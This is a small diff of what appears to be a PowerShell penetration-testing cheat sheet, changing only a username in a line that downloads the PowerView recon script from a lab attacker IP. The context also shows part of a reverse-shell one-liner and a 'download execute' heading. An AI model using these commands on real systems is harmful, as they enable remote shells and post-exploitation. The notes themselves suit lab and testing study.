@@ -16,7 +16,7 @@ $client = New-Object System.Net.Sockets.TCPClient("<IP>",PORT);$stream = $client
 
 #Download File Powershell V2 
 
-(New-Object Net.WebClient).DownloadFile('http://10.10.15.58/powerview.ps1', 'C:\users\wsadmin\Desktop\powerview.ps1') 
+(New-Object Net.WebClient).DownloadFile('http://10.10.15.58/powerview.ps1', 'C:\users\someuser\Desktop\powerview.ps1') 
 
 #Download Execute Powershell One Liner 
 
